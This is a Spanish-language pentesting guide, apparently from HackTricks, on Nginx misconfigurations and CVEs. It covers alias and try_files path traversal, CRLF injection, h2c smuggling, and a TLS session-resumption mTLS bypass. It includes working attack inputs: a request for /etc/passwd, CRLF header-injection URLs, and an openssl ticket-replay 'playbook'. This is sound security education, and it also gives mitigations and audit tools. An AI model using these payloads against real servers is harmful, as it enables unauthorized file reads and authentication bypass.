# Nginx

{{#include ../../banners/hacktricks-training.md}}


## Falta root en la location <a href="#missing-root-location" id="missing-root-location"></a>

Al configurar el servidor Nginx, la **root directive** juega un papel crítico al definir el directorio base desde el cual se sirven los archivos. Considere el siguiente ejemplo:
```bash
server {
root /etc/nginx;

location /hello.txt {
try_files $uri $uri/ =404;
proxy_pass http://127.0.0.1:8080/;
}
}
```
En esta configuración, `/etc/nginx` está designado como el directorio root. Esta configuración permite el acceso a archivos dentro del directorio root especificado, como `/hello.txt`. Sin embargo, es crucial notar que solo se define una location específica (`/hello.txt`). No hay configuración para la location raíz (`location / {...}`). Esta omisión significa que la directiva root se aplica globalmente, permitiendo que las solicitudes a la ruta raíz `/` accedan a archivos bajo `/etc/nginx`.

Surge una consideración crítica de seguridad a partir de esta configuración. Una simple petición `GET`, como `GET /nginx.conf`, podría exponer información sensible al servir el archivo de configuración de Nginx ubicado en `/etc/nginx/nginx.conf`. Establecer el root a un directorio menos sensible, como `/etc`, podría mitigar este riesgo; sin embargo, aún podría permitir el acceso no intencionado a otros archivos críticos, incluyendo otros archivos de configuración, logs de acceso, e incluso credenciales cifradas usadas para la autenticación HTTP básica.

## Misconfiguración de Alias LFI <a href="#alias-lfi-misconfiguration" id="alias-lfi-misconfiguration"></a>

En los archivos de configuración de Nginx, se requiere una inspección minuciosa de las directivas "location". Una vulnerabilidad conocida como Local File Inclusion (LFI) puede introducirse inadvertidamente mediante una configuración que se asemeja a la siguiente:
```
location /imgs {
alias /path/images/;
}
```
Esta configuración es vulnerable a ataques LFI debido a que el servidor interpreta peticiones como `/imgs../flag.txt` como un intento de acceder a archivos fuera del directorio previsto, resolviendo efectivamente a `/path/images/../flag.txt`. Esta falla permite a los atacantes recuperar archivos del sistema de archivos del servidor que no deberían ser accesibles vía web.

Para mitigar esta vulnerabilidad, la configuración debería ajustarse para:
```
location /imgs/ {
alias /path/images/;
}
```
Más información: [https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/)

Pruebas de Accunetix:
```
alias../ => HTTP status code 403
alias.../ => HTTP status code 404
alias../../ => HTTP status code 403
alias../../../../../../../../../../../ => HTTP status code 400
alias../ => HTTP status code 403
```
## Restricción de ruta insegura <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

Consulta la siguiente página para aprender how to bypass directivas como:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
{{#ref}}
../../pentesting-web/proxy-waf-protections-bypass.md
{{#endref}}

## Uso inseguro de variables / HTTP Request Splitting <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

> [!CAUTION]
> Variables vulnerables `$uri` and `$document_ur`i y esto puede solucionarse reemplazándolas por `$request_uri`.
>
> Una regex también puede ser vulnerable como:
>
> `location ~ /docs/([^/])? { … $1 … }` - Vulnerable
>
> `location ~ /docs/([^/\s])? { … $1 … }` - No es vulnerable (verifica espacios)
>
> `location ~ /docs/(.*)? { … $1 … }` - No es vulnerable

Una vulnerabilidad en la configuración de Nginx se demuestra con el ejemplo siguiente:
```
location / {
return 302 https://example.com$uri;
}
```
Los caracteres \r (Retorno de carro) y \n (Salto de línea) señalan caracteres de nueva línea en las peticiones HTTP, y sus formas codificadas en URL se representan como `%0d%0a`. Incluir estos caracteres en una petición (p. ej., `http://localhost/%0d%0aDetectify:%20clrf`) a un servidor mal configurado provoca que el servidor emita una nueva cabecera llamada `Detectify`. Esto ocurre porque la variable $uri decodifica los caracteres de nueva línea codificados en URL, provocando una cabecera inesperada en la respuesta:
```
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.19.3
Content-Type: text/html
Content-Length: 145
Connection: keep-alive
Location: https://example.com/
Detectify: clrf
```
Aprende más sobre los riesgos de CRLF injection and response splitting en [https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/](https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/).

También esta técnica está [**explained in this talk**](https://www.youtube.com/watch?v=gWQyWdZbdoY&list=PL0xCSYnG_iTtJe2V6PQqamBF73n7-f1Nr&index=77) con algunos ejemplos vulnerables y mecanismos de detección. Por ejemplo, para detectar esta mala configuración desde una perspectiva blackbox podrías enviar estas peticiones:

- `https://example.com/%20X` - Any HTTP code
- `https://example.com/%20H` - 400 Bad Request

Si es vulnerable, la primera devolverá algo ya que "X" es cualquier HTTP method y la segunda devolverá un error porque H no es un método válido. Así que el servidor recibirá algo como: `GET / H HTTP/1.1` y esto disparará el error.

Otros ejemplos de detección serían:

- `http://company.tld/%20HTTP/1.1%0D%0AXXXX:%20x` - Any HTTP code
- `http://company.tld/%20HTTP/1.1%0D%0AHost:%20x` - 400 Bad Request

Algunas configuraciones vulnerables encontradas y presentadas en esa charla fueron:

- Observa cómo **`$uri`** se coloca tal cual en la URL final
```
location ^~ /lite/api/ {
proxy_pass http://lite-backend$uri$is_args$args;
}
```
- Observa cómo **`$uri`** vuelve a estar en la URL (esta vez dentro de un parámetro)
```
location ~ ^/dna/payment {
rewrite ^/dna/([^/]+) /registered/main.pl?cmd=unifiedPayment&context=$1&native_uri=$uri break;
proxy_pass http://$back;
```
- Ahora en AWS S3
```
location /s3/ {
proxy_pass https://company-bucket.s3.amazonaws.com$uri;
}
```
### Cualquier variable

Se descubrió que los **datos proporcionados por el usuario** podrían ser tratados como una **variable de Nginx** en ciertas circunstancias. El origen de este comportamiento sigue siendo algo escurridizo; sin embargo, no es raro ni sencillo de verificar. Esta anomalía fue destacada en un informe de seguridad en HackerOne, que puede verse [aquí](https://hackerone.com/reports/370094). Una investigación adicional del mensaje de error llevó a identificar su aparición dentro del [SSI filter module of Nginx's codebase](https://github.com/nginx/nginx/blob/2187586207e1465d289ae64cedc829719a048a39/src/http/modules/ngx_http_ssi_filter_module.c#L365), señalando a Server Side Includes (SSI) como la causa raíz.

Para **detectar esta misconfiguración**, se puede ejecutar el siguiente comando, que establece un encabezado Referer para comprobar la impresión de variables:
```bash
$ curl -H ‘Referer: bar’ http://localhost/foo$http_referer | grep ‘foobar’
```
Los escaneos en busca de esta misconfiguración en sistemas revelaron múltiples instancias donde variables de Nginx podían ser mostradas por un usuario. Sin embargo, la disminución en el número de instancias vulnerables sugiere que los esfuerzos por parchear este problema han tenido cierto éxito.

### Usando try_files con variables $URI$ARGS

La siguiente misconfiguración de Nginx puede llevar a una vulnerabilidad LFI:
```
location / {
try_files $uri$args $uri$args/ /index.html;
}
```
En nuestra configuración tenemos la directiva `try_files`, que se utiliza para comprobar la existencia de archivos en un orden especificado. Nginx servirá el primero que encuentre. La sintaxis básica de la directiva `try_files` es la siguiente:
```
try_files file1 file2 ... fileN fallback;
```
Nginx comprobará la existencia de cada archivo en el orden especificado. Si un archivo existe, se servirá inmediatamente. Si ninguno de los archivos especificados existe, la solicitud se pasará a la opción de fallback, que puede ser otra URI o una página de error específica.

Sin embargo, al usar las variables `$uri$args` en esta directiva, Nginx intentará buscar un archivo que coincida con la URI de la solicitud combinada con cualquier argumento de la query string. Por lo tanto, podemos explotar esta configuración:
```
http {
server {
root /var/www/html/public;

location / {
try_files $uri$args $uri$args/ /index.html;
}
}
}
```
Con la siguiente payload:
```
GET /?../../../../../../../../etc/passwd HTTP/1.1
Host: example.com
```
Usando nuestro payload escaparemos del directorio raíz (definido en la configuración de Nginx) y cargaremos el archivo `/etc/passwd`. En debug logs podemos observar cómo Nginx prueba los archivos:
```
...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 trying to use file: "/../../../../../../../../etc/passwd" "/var/www/html/public/../../../../../../../../etc/passwd"
2025/07/11 15:49:16 [debug] 79694#79694: *4 try file uri: "/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 http filename: "/var/www/html/public/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 HTTP/1.1 200 OK

```
PoC contra Nginx usando la configuración mencionada arriba:
![Example burp request](../../images/nginx_try_files.png)

## Lectura de la respuesta cruda del backend

Nginx ofrece una funcionalidad mediante `proxy_pass` que permite interceptar errores y cabeceras HTTP generadas por el backend, con el objetivo de ocultar mensajes de error internos y cabeceras. Esto se logra haciendo que Nginx sirva páginas de error personalizadas en respuesta a errores del backend. Sin embargo, surgen problemas cuando Nginx recibe una petición HTTP inválida. Dicha petición se reenvía al backend tal como se recibió, y la respuesta cruda del backend se envía directamente al client sin la intervención de Nginx.

Consideremos un escenario de ejemplo que involucra una aplicación uWSGI:
```python
def application(environ, start_response):
start_response('500 Error', [('Content-Type', 'text/html'), ('Secret-Header', 'secret-info')])
return [b"Secret info, should not be visible!"]
```
Para gestionar esto, se usan directivas específicas en la configuración de Nginx:
```
http {
error_page 500 /html/error.html;
proxy_intercept_errors on;
proxy_hide_header Secret-Header;
}
```
- [**proxy_intercept_errors**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_intercept_errors): Esta directiva permite que Nginx sirva una respuesta personalizada para respuestas del backend con un código de estado mayor a 300. Garantiza que, para nuestra aplicación de ejemplo uWSGI, una respuesta `500 Error` sea interceptada y gestionada por Nginx.
- [**proxy_hide_header**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_hide_header): Como su nombre indica, esta directiva oculta cabeceras HTTP especificadas al cliente, mejorando la privacidad y la seguridad.

Cuando se realiza una petición `GET` válida, Nginx la procesa normalmente, devolviendo una respuesta de error estándar sin revelar cabeceras secretas. Sin embargo, una petición HTTP inválida elude este mecanismo, resultando en la exposición de respuestas crudas del backend, incluyendo cabeceras secretas y mensajes de error.

## merge_slashes establecido en off

Por defecto, la **directiva `merge_slashes` de Nginx** está configurada en **`on`**, lo que comprime múltiples barras diagonales en una URL en una sola barra. Esta característica, aunque agiliza el procesamiento de URLs, puede ocultar inadvertidamente vulnerabilidades en aplicaciones detrás de Nginx, particularmente las propensas a local file inclusion (LFI). Expertos en seguridad Danny Robinson y Rotem Bar han destacado los riesgos potenciales asociados con este comportamiento por defecto, especialmente cuando Nginx actúa como reverse-proxy.

Para mitigar esos riesgos, se recomienda desactivar la directiva `merge_slashes` para aplicaciones susceptibles a estas vulnerabilidades. Esto asegura que Nginx reenvíe las peticiones a la aplicación sin alterar la estructura de la URL, evitando así enmascarar problemas de seguridad subyacentes.

For more information check [Danny Robinson and Rotem Bar](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d).

### **Encabezados de respuesta Maclicious**

Como se muestra en [**this writeup**](https://mizu.re/post/cors-playground), hay ciertas cabeceras que, si están presentes en la respuesta del servidor web, cambiarán el comportamiento del proxy Nginx. Puedes consultarlas [**in the docs**](https://www.nginx.com/resources/wiki/start/topics/examples/x-accel/):

- `X-Accel-Redirect`: Indica a Nginx que redirija internamente una petición a una ubicación especificada.
- `X-Accel-Buffering`: Controla si Nginx debe o no almacenar en buffer la respuesta.
- `X-Accel-Charset`: Establece el conjunto de caracteres para la respuesta cuando se usa X-Accel-Redirect.
- `X-Accel-Expires`: Establece el tiempo de expiración de la respuesta cuando se usa X-Accel-Redirect.
- `X-Accel-Limit-Rate`: Limita la velocidad de transferencia de las respuestas cuando se usa X-Accel-Redirect.

Por ejemplo, la cabecera **`X-Accel-Redirect`** provocará una **redirección** interna en nginx. Así, tener una configuración de nginx con algo como **`root /`** y una respuesta del servidor web con **`X-Accel-Redirect: .env`** hará que nginx envíe el contenido de **`/.env`** (Path Traversal).

### **Valor por defecto en la directiva `map`**

En la **configuración de Nginx**, la directiva `map` suele jugar un papel en el **control de autorización**. Un error común es no especificar un valor **default**, lo que podría conducir a acceso no autorizado. Por ejemplo:
```yaml
http {
map $uri $mappocallow {
/map-poc/private 0;
/map-poc/secret 0;
/map-poc/public 1;
}
}
```

```yaml
server {
location /map-poc {
if ($mappocallow = 0) {return 403;}
return 200 "Hello. It is private area: $mappocallow";
}
}
```
Sin un `default`, un **usuario malicioso** puede eludir la seguridad accediendo a un **URI indefinido** dentro de `/map-poc`. [El manual de Nginx](https://nginx.org/en/docs/http/ngx_http_map_module.html) recomienda establecer un **default value** para evitar estos problemas.

### **Vulnerabilidad de DNS Spoofing**

El DNS spoofing contra Nginx es factible bajo ciertas condiciones. Si un atacante conoce el **servidor DNS** usado por Nginx y puede interceptar sus consultas DNS, puede falsificar los registros DNS. Este método, sin embargo, es ineficaz si Nginx está configurado para usar **localhost (127.0.0.1)** para la resolución DNS. Nginx permite especificar un servidor DNS de la siguiente manera:
```yaml
resolver 8.8.8.8;
```
### **Directivas `proxy_pass` y `internal`**

La directiva **`proxy_pass`** se utiliza para redirigir solicitudes a otros servidores, ya sea internamente o externamente. La directiva **`internal`** asegura que ciertas ubicaciones solo sean accesibles desde Nginx. Aunque estas directivas no son vulnerabilidades por sí mismas, su configuración requiere un examen cuidadoso para prevenir fallos de seguridad.

## proxy_set_header Upgrade & Connection

Si el servidor nginx está configurado para pasar los encabezados Upgrade y Connection, se podría realizar un [**h2c Smuggling attack**](../../pentesting-web/h2c-smuggling.md) para acceder a endpoints protegidos/internos.

> [!CAUTION]
> Esta vulnerabilidad permitiría a un atacante **establecer una conexión directa con el endpoint `proxy_pass`** (`http://backend:9999` en este caso) cuyo contenido no será verificado por nginx.

Ejemplo de configuración vulnerable para robar `/flag` de [aquí](https://bishopfox.com/blog/h2c-smuggling-request):
```
server {
listen       443 ssl;
server_name  localhost;

ssl_certificate       /usr/local/nginx/conf/cert.pem;
ssl_certificate_key   /usr/local/nginx/conf/privkey.pem;

location / {
proxy_pass http://backend:9999;
proxy_http_version 1.1;
proxy_set_header Upgrade $http_upgrade;
proxy_set_header Connection $http_connection;
}

location /flag {
deny all;
}
```
> [!WARNING]
> Ten en cuenta que incluso si `proxy_pass` apuntaba a una **path** específica como `http://backend:9999/socket.io` la conexión se establecerá con `http://backend:9999` por lo que puedes **contact any other path inside that internal endpoint. So it doesn't matter if a path is specified in the URL of proxy_pass.**

## Módulo HTTP/3 QUIC remoto DoS & leak (2024)

Durante 2024 Nginx divulgó CVE-2024-31079, CVE-2024-32760, CVE-2024-34161 y CVE-2024-35200 mostrando que una **single hostile QUIC session** puede provocar que los procesos worker se bloqueen o leak memory siempre que el experimental `ngx_http_v3_module` esté compilado y se exponga un socket `listen ... quic`. Las builds afectadas son 1.25.0–1.25.5 y 1.26.0, mientras que 1.27.0/1.26.1 incluyen los fixes; la divulgación de memoria (CVE-2024-34161) además requiere MTUs mayores de 4096 bytes para exponer datos sensibles (detalles en el 2024 nginx advisory referenciado abajo).

**Recon & exploitation hints**

- HTTP/3 es opt-in, así que escanea respuestas `Alt-Svc: h3=":443"` o realiza brute-force de handshakes QUIC en UDP/443; una vez confirmado, fuzz el handshake y los STREAM frames con payloads personalizados (`quiche-client`/`nghttp3`) para provocar worker crashes y forzar log leak.
- Fingerprint rápidamente el soporte del target con:
```bash
nginx -V 2>&1 | grep -i http_v3
rg -n "listen .*quic" /etc/nginx/
```
## Bypass de reanudación de sesión TLS en la autenticación con certificado de cliente (CVE-2025-23419)

Un aviso de febrero de 2025 reveló que nginx 1.11.4–1.27.3 compilado con OpenSSL permite **reusing a TLS 1.3 session** de un name-based virtual host dentro de otro, por lo que un cliente que negoció un host sin certificado puede reproducir el ticket/PSK para acceder a un vhost protegido con `ssl_verify_client on;` y omitir por completo el mTLS. El bug se desencadena siempre que múltiples virtual hosts comparten la misma TLS 1.3 session cache and tickets (ver el aviso de nginx de 2025 referenciado abajo).

**Playbook del atacante**
```bash
# 1. Create a TLS session on the public vhost and save the session ticket
openssl s_client -connect public.example.com:443 -sess_out ticket.pem

# 2. Replay that session ticket against the mTLS vhost before it expires
openssl s_client -connect admin.example.com:443 -sess_in ticket.pem -ign_eof
```
Si el objetivo es vulnerable, el segundo handshake se completa sin presentar un certificado de cliente, revelando ubicaciones protegidas.

**Qué auditar**

- Bloques `server_name` mezclados que comparten `ssl_session_cache shared:SSL` más `ssl_session_tickets on;`.
- Bloques Admin/API que esperan mTLS pero heredan configuraciones compartidas de caché/tickets de sesión desde hosts públicos.
- Automatización que habilita la reanudación de sesión de TLS 1.3 globalmente (p. ej., roles de Ansible) sin considerar el aislamiento de vhost.

## Resiliencia ante HTTP/2 Rapid Reset (comportamiento de CVE-2023-44487)

El ataque HTTP/2 Rapid Reset (CVE-2023-44487) aún afecta a nginx cuando los operadores aumentan `keepalive_requests` o `http2_max_concurrent_streams` por encima de los valores por defecto: un atacante abre una conexión HTTP/2, la inunda con miles de streams y luego emite inmediatamente frames `RST_STREAM` de modo que el techo de concurrencia nunca se alcanza mientras la CPU sigue consumiéndose en la lógica de cierre. Los valores por defecto de nginx (128 concurrent streams, 1000 keepalive requests) mantienen el radio de impacto pequeño; elevar esos límites "sustancialmente" hace trivial dejar sin recursos a los workers incluso desde un solo cliente (ver el write-up de F5 referenciado abajo).

**Consejos de detección**
```bash
# Highlight risky knobs
rg -n "http2_max_concurrent_streams" /etc/nginx/
rg -n "keepalive_requests" /etc/nginx/
```
Los hosts que revelan valores inusualmente altos para esas directivas son objetivos primarios: un cliente HTTP/2 puede iterar la creación de streams y enviar marcos `RST_STREAM` instantáneos para mantener la CPU al máximo sin activar el límite de concurrencia.

## Pruébalo tú mismo

Detectify ha creado un repositorio en GitHub donde puedes usar Docker para configurar tu propio servidor de prueba Nginx vulnerable con algunas de las malas configuraciones discutidas en este artículo y probar a encontrarlas tú mismo!

[https://github.com/detectify/vulnerable-nginx](https://github.com/detectify/vulnerable-nginx)

## Herramientas de análisis estático

### [gixy-ng](https://github.com/dvershinin/gixy) & [GixyNG](https://github.com/megamansec/gixyng) & [GIXY](https://github.com/yandex/gixy)


- [GixyNG](https://github.com/megamansec/gixyng) (an updated fork of GIXY) es una herramienta para analizar configuraciones de Nginx, con el objetivo de encontrar vulnerabilidades, directivas inseguras y malas configuraciones de riesgo. También identifica malas configuraciones que afectan el rendimiento y detecta oportunidades de hardening no aplicadas, permitiendo la detección automatizada de fallos.
- [gixy-ng](https://github.com/dvershinin/gixy) (the actively maintained fork of GIXY) es una herramienta para analizar configuraciones de Nginx, con el objetivo de encontrar vulnerabilidades, directivas inseguras y malas configuraciones de riesgo. También identifica malas configuraciones que afectan el rendimiento y detecta oportunidades de hardening no aplicadas, permitiendo la detección automatizada de fallos.

### [Nginxpwner](https://github.com/stark0de/nginxpwner)

Nginxpwner es una herramienta sencilla para buscar malas configuraciones comunes de Nginx y vulnerabilidades.

## Referencias

- [**https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/**](https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/)
- [**http://blog.zorinaq.com/nginx-resolver-vulns/**](http://blog.zorinaq.com/nginx-resolver-vulns/)
- [**https://github.com/yandex/gixy/issues/115**](https://github.com/yandex/gixy/issues/115)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html**](https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html**](https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html)
- [**https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products**](https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products)


{{#include ../../banners/hacktricks-training.md}}
